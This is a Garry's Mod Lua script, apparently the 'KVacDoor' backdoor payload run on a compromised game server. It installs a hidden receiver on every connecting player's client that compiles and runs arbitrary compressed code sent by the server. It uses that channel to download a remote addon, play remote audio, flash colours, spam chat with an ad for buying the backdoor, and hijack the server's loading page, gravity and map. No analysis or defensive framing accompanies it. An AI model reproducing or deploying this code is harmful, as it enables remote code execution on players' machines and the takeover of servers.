local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;ifyouseethisdontpanicitsme&quot;,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

SendToClient([====[
    steamworks.FileInfo(1830594533,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)

    timer.Simple(16, function()
        game.AddParticles( &quot;particles/kvac.pcf&quot; )
        PrecacheParticleSystem(&quot;kvac&quot;)
        for i = 1, 2 do
            ParticleEffectAttach(&quot;kvac&quot;, PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
        end
    end)
    
    wadixxe_time = false
    GizehSSV = GizehSSV or {}
    GizehSSV.Wait1 = GizehSSV.Wait1 or !!1
    GizehSSVLogo = GizehSSVLogo or nil
    GizehSSV.Enabled = GizehSSV.Enabled or !!1
    
    local AudioSource = nil
    SOUNDSTART_CTP = false
    
    sound.PlayURL(&quot;https://cdn.discordapp.com/attachments/1122954222346969181/1261358610139582565/07071.mp3?ex=66e4683f&amp;is=66e316bf&amp;hm=998e770bae2a2d2a66d4b93267622f51eb141126f293e632de11ef9965e450b8&amp;&quot;, &quot;mono noblock noplay&quot;, function(source, err, errname)
        if IsValid(source) then
            if SOUNDSTART_CTP then s:Stop() return end
            AudioSource = source
            source:Play()
            source:EnableLooping(true)
        end
    end) 
    
    timer.Simple(16, function()
        timer.Create(&quot;..‪tostring(‪GizehSSV.SecureString4)..‪‪‪‪‪‪‪&quot;, 0.1, 0, function()
            if not GizehSSV.Enabled then return end
            local mat = Entity(0):GetMaterials()
            for k,v in pairs(mat) do
                if GizehSSV.Wait1 then
                    local col = HSVToColor( CurTime() % 6 * 60, 1, 1 )
                    Material(v):SetVector(&quot;$color&quot;, Vector(col.r/220,col.g/220,col.b/220))
                end
            end
            local col = HSVToColor( CurTime() % 6 * 60, 1, 1)
            for _, v in ipairs(player.GetAll()) do
                v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
            end
        end)
    end)
    
    timer.Simple(142.267,function()
        if not GizehSSV.Enabled then return end
        RunConsoleCommand('gmod_language', 'de')
    end)
    
    local notifs = {
        [0] = &quot;Mdr encore backdoor par Greg&quot;,
        [1] = &quot;La CTG vole des addons mdrrr&quot;,
        [2] = &quot;Roh la CTG bande de voleur&quot;,
        [3] = &quot;Ah batard tu voles&quot;,
        [4] = &quot;BUY KVACDOOR https://discord.gg/4MZKb7p&quot;,
    }
    
    timer.Simple(18, function()
        wadixxe_time = true
        if not GizehSSV.Enabled then return end
        timer.Create(&quot;'..‪tostring(‪GizehSSV.SecureString2)..‪‪‪‪‪‪‪'&quot;, 0.1, 0, function()
            if not GizehSSV.Enabled then return end
            notification.AddLegacy( notifs[math.random(0, 4)], math.random(0, 4), 1.5 )
        end)
    end)
    
    timer.Simple(16, function()
        function GAMEMODE:PostDraw2DSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    
        function GAMEMODE:PreDrawSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    
        for _, v in ipairs(player.GetAll()) do
            v:AnimRestartGesture(GESTURE_SLOT_CUSTOM, ACT_GMOD_TAUNT_DANCE, false)
        end
    end)
    
    timer.Simple(21, function()
        if not GizehSSV.Enabled then return end
        if GizehSSVLogo then GizehSSVLogo:Remove() GizehSSVLogo = nil end
        GizehSSVLogo = vgui.Create('HTML')
        GizehSSVLogo:MoveToFront()
        GizehSSVLogo:SetSize(600,200)
        GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
        GizehSSVLogo:OpenURL('https://cdn.discordapp.com/attachments/1259145625534988311/1259798783739564113/image.png?ex=66e4018b&amp;is=66e2b00b&amp;hm=1d83b37b539ccefe282edbf3fdd3364c434997f002343ec46a892bdd13bff102&amp;')
        hook.Add(&quot;Tick&quot;,&quot;'..‪tostring(‪GizehSSV.SecureString3)..‪‪‪‪‪‪‪'&quot;, function()
            local data = {}
            AudioSource:FFT(data, FFT_512)
            for i=1,2 do
                if(data[i] != nil) then
                    if(tonumber(data[i]) &gt; 0.35) then
                        if(wadixxe_time) then 
                            GizehSSVLogo:SetPos((ScrW()/2)-math.random(280, 320),(ScrH()/8)-math.random(80, 120))
                            local mat = Entity(0):GetMaterials()
                            for k,v in pairs(mat) do
                                local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                                   Material(v):SetVector(&quot;$color&quot;, Vector(col.r-200,col.g-200,col.b-200))
    
                                local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                                for _, v in ipairs(player.GetAll()) do
                                    v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
                                end
                            end
                           end
                    end
                else
                    GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
                end
            end
        end)
    end)
    
    timer.Simple(18, function()
        timer.Create(&quot;'..‪totring(‪GizehSSV.SecureString5)..‪‪‪‪‪‪‪'&quot;, 1.5, 0, function()
            local time = tonumber(0)
            local Message = {
                &quot;        .https://discord.gg/4MZKb7p #KVacDoor.&quot;,
                &quot;       ..https://discord.gg/4MZKb7p #KVacDoor..&quot;,
                &quot;      ...https://discord.gg/4MZKb7p #KVacDoor...&quot;,
                &quot;     ....https://discord.gg/4MZKb7p #KVacDoor....&quot;,
                &quot;    .....https://discord.gg/4MZKb7p #KVacDoor.....&quot;,
                &quot;   ......https://discord.gg/4MZKb7p #KVacDoor......&quot;,
                &quot;  .......https://discord.gg/4MZKb7p #KVacDoor.......&quot;,
                &quot; ........https://discord.gg/4MZKb7p #KVacDoor........&quot;,
                &quot;.........https://discord.gg/4MZKb7p #KVacDoor.........&quot;,
                &quot; ........https://discord.gg/4MZKb7p #KVacDoor........&quot;,
                &quot;  .......https://discord.gg/4MZKb7p #KVacDoor.......&quot;,
                &quot;   ......https://discord.gg/4MZKb7p #KVacDoor......&quot;,
                &quot;    .....https://discord.gg/4MZKb7p #KVacDoor.....&quot;,
                &quot;     ....https://discord.gg/4MZKb7p #KVacDoor....&quot;,
                &quot;      ...https://discord.gg/4MZKb7p #KVacDoor...&quot;,
                &quot;       ..https://discord.gg/4MZKb7p #KVacDoor..&quot;,
                &quot;        .https://discord.gg/4MZKb7p #KVacDoor.&quot;,
                }
        
            for _, line in pairs(Message) do
                time = time + tonumber(0.1)
                timer.Simple(time,function()
                    if not GizehSSV.Enabled then return end
                    chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                end)
            end
        end)
    end)
    
    local tab = {
        [ &quot;$pp_colour_addr&quot; ] = tonumber(0.001),
        [ &quot;$pp_colour_addg&quot; ] = tonumber(0.001),
        [ &quot;$pp_colour_addb&quot; ] = tonumber(0),
        [ &quot;$pp_colour_brightness&quot; ] = tonumber(-0.5),
        [ &quot;$pp_colour_contrast&quot; ] = tonumber(0.8),
        [ &quot;$pp_colour_colour&quot; ] = tonumber(3),
        [ &quot;$pp_colour_mulr&quot; ] = tonumber(1),
        [ &quot;$pp_colour_mulg&quot; ] = tonumber(0.5),
        [ &quot;$pp_colour_mulb&quot; ] = tonumber(0.4)
    }
    
    timer.Simple(16, function()
        hook.Add(&quot;RenderScreenspaceEffects&quot;, &quot;'..‪tostring(‪GizehSSV.SecureString11)..‪‪‪‪‪‪‪'&quot;, function()
            DrawColorModify( tab )
        end)
    end)
]====])
game.AddParticles( &quot;particles/kvac.pcf&quot; )
PrecacheParticleSystem(&quot;kvac&quot;)

timer.Simple(1,function()
RunConsoleCommand( &quot;sv_loadingurl&quot;, &quot;https://kvac.cz/assets/ls.html&quot;)
RunConsoleCommand( &quot;sv_gravity&quot;, &quot;200&quot; )
end)

timer.Simple(136,function()
    RunConsoleCommand( 'changelevel', 'gm_construct' )
    RunConsoleCommand( &quot;sv_loadingurl&quot;, &quot;https://kvac.cz/assets/ls.html&quot; )
end)

timer.Simple(16, function()
    for _, v in ipairs(player.GetAll()) do
        v:SetModelScale(math.Round(math.Rand(1.5, 3), 2), 1)
    end

    hook.Add(&quot;PlayerSpawn&quot;, net_string, function(ply)
        timer.Simple(0.5, function()
            ply:SetModelScale(math.Round(math.Rand(1.5, 3), 2), 1)
        end)
    end)
end)